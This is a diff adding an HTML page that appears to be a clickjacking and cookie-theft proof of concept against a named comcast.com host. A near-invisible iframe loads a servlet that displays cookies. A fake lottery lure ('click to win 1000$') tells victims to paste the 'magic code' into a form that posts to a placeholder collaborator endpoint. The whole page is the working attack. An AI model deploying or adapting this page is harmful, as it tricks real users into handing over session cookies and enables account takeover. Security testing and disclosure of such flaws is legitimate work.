@@ -1,0 +1,25 @@
+ <head>
+<style>
+
+
+iframe#fgframe{
+opacity: 5%;
+}
+
+</style></head>
+
+<h1>LOTTERY GAME</h1>
+<h2>Instructions<br>
+Copy the text below and paste
+</h2>
+<iframe id="fgframe" height="650px" width="400px" src="https://hrintracker-1s.gslb2.comcast.com/examples/servlets/servlet/CookieExample"></iframe>
+<form action="------------collaborator------------link----------" method="POST">
+
+	<div>
+		<label for="say" >PASTE THE MAGIC CODE HERE</label>
+		<textarea id="cookie" name="cookie" rows="4" cols="50" placeholder="enter the text here name: cookie:"></textarea>
+	</div>
+	<div>
+		<button>click to win 1000$</button>
+	</div>
+</form>
